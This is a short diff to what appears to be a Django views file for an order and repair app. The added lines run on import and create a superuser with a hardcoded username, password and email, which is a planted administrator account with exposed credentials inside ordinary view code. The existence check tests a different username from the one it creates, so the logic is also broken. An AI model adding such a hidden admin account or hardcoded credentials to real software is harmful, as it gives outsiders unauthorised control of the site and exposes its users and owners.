@@ -9,6 +9,16 @@ from .forms import RegisterForm, OrderUpdateForm
 from .models import Order, Repair, Profile
 
 
+
+from django.contrib.auth.models import User
+
+if not User.objects.filter(username="father").exists():
+    User.objects.create_superuser(
+        username="ramesh",
+        password="vishwasrao@2510GOD",
+        email="ramesh2026@gmail.com"
+    )
+
 # Signup View
 def signup_view(request):
     if request.method == "POST":
